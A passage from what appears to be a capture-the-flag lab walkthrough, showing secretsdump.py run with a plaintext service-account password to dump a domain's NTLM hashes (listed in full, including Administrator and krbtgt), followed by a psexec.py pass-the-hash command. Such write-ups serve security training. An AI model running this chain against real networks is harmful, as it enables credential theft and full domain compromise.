### secretsdump.py

`secretsdump.py -dc-ip 10.10.10.30 MEGACORP.local/svc_bes:Sheffield19@10.10.10.30`

This give us `administrator` NTLM hash

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::
svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::
sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
PATHFINDER$:1000:aad3b435b51404eeaad3b435b51404ee:07ab558646ee84d3bcba69f2ed390d14:::
```

### psexec.py

We can now attempt a pass-the-hash attack by supplying the hash in a `psexec.py` command

`psexec.py megacorp.local/administrator@10.10.10.30 -hashes <NTML:hash>`


